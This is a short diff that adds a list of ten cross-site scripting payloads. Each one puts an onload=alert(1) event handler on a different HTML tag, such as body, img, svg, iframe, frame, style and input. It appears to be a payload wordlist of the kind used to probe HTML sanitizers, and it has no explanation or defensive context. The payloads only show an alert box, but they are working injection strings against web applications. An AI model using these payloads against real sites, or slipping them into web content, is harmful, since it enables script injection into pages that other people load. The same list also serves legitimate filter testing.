@@ -1,0 +1,10 @@
+<body onload=alert(1)>
+<img src=validimage.png onload=alert(1)>
+<embed src=/ onload=alert(1)>
+<script onload=alert(1) src=validjs.js></script>
+<style onload=alert(1)></style>
+<svg onload=alert(1)>
+<frameset><frame onload=alert(1)>
+<iframe onload=alert(1)></iframe>
+<image src=validimage.png onload=alert(1)>
+<input type=image src=validimage.png onload=alert(1)>
